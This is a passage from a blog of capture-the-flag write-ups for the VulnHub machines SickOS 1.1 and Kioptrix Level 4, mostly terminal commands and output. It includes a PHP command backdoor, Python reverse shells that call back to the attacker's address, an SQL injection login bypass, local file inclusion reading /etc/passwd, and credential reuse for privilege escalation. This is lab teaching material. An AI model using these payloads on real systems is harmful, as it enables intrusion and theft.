</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX</span></code></pre></td></tr></table></div></figure>


<p>It does not work, the server is still asking password, even when we try to set more restricted permission:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys"
</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh"
</span><span class='line'>
</span><span class='line'>root@kali32:~$ ssh -i blabla 192.168.80.169 -l www-data
</span><span class='line'>www-data@192.168.80.169's password:</span></code></pre></td></tr></table></div></figure>


<p>We come back to this later. Trying different payload, we encode the following
command and invoke via our backdoor, the second output is ascii encoded using
Burp Encoder:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&#39;/bin/bash&#39;)&quot;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">80.137</span> <span class="mi">1400</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30</span></code></pre></td></tr></table></div></figure>


<p>This is how we got the remote shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nc -l -p 1400
</span><span class='line'>
</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30"</span></code></pre></td></tr></table></div></figure>


<p>We connect to MySQL again, this time we noticed that there is user <code>sickos</code> with the same password as mysql <code>root</code>, that is <code>john@123</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@SickOs:/etc/mysql$ mysql -uroot -pjohn@123 mysql
</span><span class='line'>mysql -uroot -pjohn@123 mysql
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 165
</span><span class='line'>Server version: 5.5.46-0ubuntu0.12.04.2 (Ubuntu)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql> SELECT User,Host,Password FROM mysql.user;
</span><span class='line'>SELECT User,Host,Password FROM mysql.user;
</span><span class='line'>+------------------+-----------+-------------------------------------------+
</span><span class='line'>| User             | Host      | Password                                  |
</span><span class='line'>+------------------+-----------+-------------------------------------------+
</span><span class='line'>| root             | localhost | *A7A20B93EC076311A63BF86B5C705B25C054DD77 |
</span><span class='line'>| root             | sickos    | *A7A20B93EC076311A63BF86B5C705B25C054DD77 |
</span><span class='line'>| root             | 127.0.0.1 | *A7A20B93EC076311A63BF86B5C705B25C054DD77 |
</span><span class='line'>| root             | ::1       | *A7A20B93EC076311A63BF86B5C705B25C054DD77 |
</span><span class='line'>| debian-sys-maint | localhost | *CB98094782C386F2459D65D97B17D1DE15D1654B |
</span><span class='line'>+------------------+-----------+-------------------------------------------+
</span><span class='line'>5 rows in set (0.00 sec)</span></code></pre></td></tr></table></div></figure>


<p>His shell uses the same password and we can easily escalate to uid 0.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@SickOs:/var/www/wolfcms/public$ su sickos
</span><span class='line'>su sickos
</span><span class='line'>Password: john@123
</span><span class='line'>
</span><span class='line'>sickos@SickOs:/var/www/wolfcms/public$
</span><span class='line'>
</span><span class='line'>sickos@SickOs:/var/www/wolfcms/public$ sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>[sudo] password for sickos: john@123
</span><span class='line'>
</span><span class='line'>Matching Defaults entries for sickos on this host:
</span><span class='line'>    env_reset,
</span><span class='line'>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span><span class='line'>
</span><span class='line'>User sickos may run the following commands on this host:
</span><span class='line'>    (ALL : ALL) ALL
</span><span class='line'>sickos@SickOs:/var/www/wolfcms/public$ sudo su
</span><span class='line'>sudo su
</span><span class='line'>
</span><span class='line'>root@SickOs:/var/www/wolfcms/public# cd /root
</span><span class='line'>cd /root
</span><span class='line'>root@SickOs:~# ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 40
</span><span class='line'>drwx------  3 root root 4096 Dec  6 21:14 .
</span><span class='line'>drwxr-xr-x 22 root root 4096 Sep 22 08:13 ..
</span><span class='line'>-rw-r--r--  1 root root   96 Dec  6 07:27 a0216ea4d51874464078c618298b1367.txt
</span><span class='line'>-rw-------  1 root root 3724 Dec  6 21:18 .bash_history
</span><span class='line'>-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
</span><span class='line'>drwx------  2 root root 4096 Sep 22 08:33 .cache
</span><span class='line'>-rw-------  1 root root   22 Dec  5 06:24 .mysql_history
</span><span class='line'>-rw-r--r--  1 root root  140 Apr 19  2012 .profile
</span><span class='line'>-rw-------  1 root root 5230 Dec  6 21:14 .viminfo
</span><span class='line'>root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
</span><span class='line'>cat a0216ea4d51874464078c618298b1367.txt
</span><span class='line'>If you are viewing this!!
</span><span class='line'>
</span><span class='line'>ROOT!
</span><span class='line'>
</span><span class='line'>You have Succesfully completed SickOS1.1.
</span><span class='line'>Thanks for Trying</span></code></pre></td></tr></table></div></figure>


<p>Reading the <code>auth.log</code>, we also found out the reason why ssh did not worked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Dec 12 15:36:27 SickOs sshd[3533]: Authentication refused: bad ownership or modes for directory /var/www</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately our user could not change this permission.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/08/25/kioptrix-level-4/">Kioptrix: Level 4</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-08-25T18:18:32+02:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>6:18 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/#">Kioptrix: Level 1.3 (#4)</a></p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.154 -sT
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-04-26 23:39 CEST
</span><span class='line'>Nmap scan report for 192.168.80.154
</span><span class='line'>Host is up (0.0015s latency).
</span><span class='line'>Not shown: 566 closed ports, 430 filtered ports
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>22/tcp  open  ssh
</span><span class='line'>80/tcp  open  http
</span><span class='line'>139/tcp open  netbios-ssn
</span><span class='line'>445/tcp open  microsoft-ds
</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds</span></code></pre></td></tr></table></div></figure>


<p>There is a member login on the <a href="http://192.168.80.154/index.php">http://192.168.80.154/index.php</a> site, we try the
following credentials (SQLi):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Username: Administrator
</span><span class='line'>Password: test' or '1'='1</span></code></pre></td></tr></table></div></figure>


<p>We logged into member site and after a few seconds found the local file
inclusion vulnerability. Filtering the <code>etc</code> string could be easily evaded for displaying <code>/etc/passwd</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.154/member.php?username=robert
</span><span class='line'>http://192.168.80.154/member.php?username=../../../../../etc/passwd -> User ../../../../..//passwd
</span><span class='line'>http://192.168.80.154/member.php?username=../../../../../eetct/passwd -> User ../../../../../et/passwd
</span><span class='line'>http://192.168.80.154/member.php?username=../../../../../eetctc/passwd -> /../../../../../etc/passwd.php
</span><span class='line'>http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00"
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
</span><span class='line'>mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
</span><span class='line'>john:x:1001:1001:,,,:/home/john:/bin/kshell
</span><span class='line'>robert:x:1002:1002:,,,:/home/robert:/bin/kshell</span></code></pre></td></tr></table></div></figure>


<p><code>smbmap</code> output reveals:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smbmap -H 192.168.80.154
</span><span class='line'>[+] Finding open SMB ports....
</span><span class='line'>[+] User SMB session establishd on 192.168.80.154...
</span><span class='line'>[+] IP: 192.168.80.154:445    Name: 192.168.80.154
</span><span class='line'>  Disk                                                    Permissions
</span><span class='line'>  ----                                                    -----------
</span><span class='line'>  print$                                              NO ACCESS
</span><span class='line'>  IPC$                                                NO ACCESS</span></code></pre></td></tr></table></div></figure>


<p>Now we try to inject php backdoor. For this purpose, we use our session file.
The file has a fixed location <code>/var/lib/php5/sess_</code> with the appended session
cookie name:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00
</span><span class='line'>
</span><span class='line'>myusername|s:13:"Administrator";mypassword|s:15:"test' or '1'='1";</span></code></pre></td></tr></table></div></figure>


<p>As we can see, the myusername session variable could be used to easily inject our code:</p>

<p>We need to login using these credentials:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Username: &lt;?php system($_REQUEST[cmd]); ?>
</span><span class='line'>Password: test' or '1'='1</span></code></pre></td></tr></table></div></figure>


<p>Now we have a backdoor, that uses parameter <code>cmd</code>. Digging deeper, we use python to execute reverse shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&cmd=id"
</span><span class='line'>myusername|s:32:"uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>";mypassword|s:15:"test' or '1'='1";
</span><span class='line'>
</span><span class='line'>root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&cmd=cat%20database.sql"
</span><span class='line'>myusername|s:32:"CREATE TABLE `members` (
</span><span class='line'>`id` int(4) NOT NULL auto_increment,
</span><span class='line'>`username` varchar(65) NOT NULL default '',
</span><span class='line'>`password` varchar(65) NOT NULL default '',
</span><span class='line'>PRIMARY KEY (`id`)
</span><span class='line'>) TYPE=MyISAM AUTO_INCREMENT=2 ;
</span><span class='line'>
</span><span class='line'>--
</span><span class='line'>-- Dumping data for table `members`
</span><span class='line'>--
</span><span class='line'>
</span><span class='line'>INSERT INTO `members` VALUES (1, 'john', '1234');
</span><span class='line'>";mypassword|s:15:"test' or '1'='1";
</span><span class='line'>
</span><span class='line'>root@kali32:/var/www/html# nc -l -p 1234
</span><span class='line'>/bin/sh: can't access tty; job control turned off
</span><span class='line'>$ id
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>
</span><span class='line'>root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&cmd=python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.80.137\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\[\"/bin/sh\",\"-i\"\]);'"
</span><span class='line'>
</span><span class='line'>$ cat checklogin.php
</span><span class='line'>&lt;?php
</span><span class='line'>ob_start();
</span><span class='line'>$host="localhost"; // Host name
</span><span class='line'>$username="root"; // Mysql username
</span><span class='line'>$password=""; // Mysql password
</span><span class='line'>$db_name="members"; // Database name
</span><span class='line'>$tbl_name="members"; // Table name
</span><span class='line'>
</span><span class='line'>// Connect to server and select databse.
</span><span class='line'>mysql_connect("$host", "$username", "$password")or die("cannot connect");
</span><span class='line'>mysql_select_db("$db_name")or die("cannot select DB");
</span><span class='line'>
</span><span class='line'>// Define $myusername and $mypassword
</span><span class='line'>$myusername=$_POST['myusername'];
</span><span class='line'>$mypassword=$_POST['mypassword'];
</span><span class='line'>
</span><span class='line'>// To protect MySQL injection (more detail about MySQL injection)
</span><span class='line'>$myusername = stripslashes($myusername);
</span><span class='line'>//$mypassword = stripslashes($mypassword);
</span><span class='line'>$myusername = mysql_real_escape_string($myusername);
</span><span class='line'>//$mypassword = mysql_real_escape_string($mypassword);
</span><span class='line'>
</span><span class='line'>//$sql="SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'";
</span><span class='line'>$result=mysql_query("SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'");
</span><span class='line'>//$result=mysql_query($sql);
</span><span class='line'>
</span><span class='line'>// Mysql_num_row is counting table row
</span><span class='line'>$count=mysql_num_rows($result);
</span><span class='line'>// If result matched $myusername and $mypassword, table row must be 1 row
</span><span class='line'>
</span><span class='line'>if($count!=0){
</span><span class='line'>// Register $myusername, $mypassword and redirect to file "login_success.php"
</span><span class='line'>  session_register("myusername");
</span><span class='line'>  session_register("mypassword");
</span><span class='line'>  header("location:login_success.php?username=$myusername");
</span><span class='line'>}
</span><span class='line'>else {
</span><span class='line'>echo "Wrong Username or Password";
</span><span class='line'>print('&lt;form method="link" action="index.php">&lt;input type=submit value="Try Again">&lt;/form>');
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>ob_end_flush();
</span><span class='line'>?></span></code></pre></td></tr></table></div></figure>


<p>Because the mysql instance is running as root user, we have a full access to
the database. We dump it and use the credentials for ssh login, for example
with the user <code>john</code>. The <code>lshell</code> is executed, but noticing his <code>.lhistory</code> file,
bash could be directly executed too. Finally, we set the suid privileges for
<code>dash</code> using mysql and obtain the root privileges:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo "select * from members" | mysql -u root members
</span><span class='line'>id    username    password
</span><span class='line'>1 john    MyNameIsJohn
</span><span class='line'>2 robert  ADGAdsafdfwt4gadfga==
</span><span class='line'>
</span><span class='line'>$ cat /home/john/.lhistory
</span><span class='line'>?
</span><span class='line'>help
</span><span class='line'>echo os.system('/bin/bash')
</span><span class='line'>exit
</span><span class='line'>su
</span><span class='line'>sudo
</span><span class='line'>?
</span><span class='line'>scp
</span><span class='line'>touch hello
</span><span class='line'>help
</span><span class='line'>ls /root
</span><span class='line'>exit
</span><span class='line'>echo os.system('/bin/bash')
</span><span class='line'>exit
</span><span class='line'>
</span><span class='line'>root@kali32:~# ssh -l john 192.168.80.154
</span><span class='line'>john@192.168.80.154's password:
</span><span class='line'>Welcome to LigGoat Security Systems - We are Watching
</span><span class='line'>== Welcome LigGoat Employee ==
</span><span class='line'>LigGoat Shell is in place so you  don't screw up
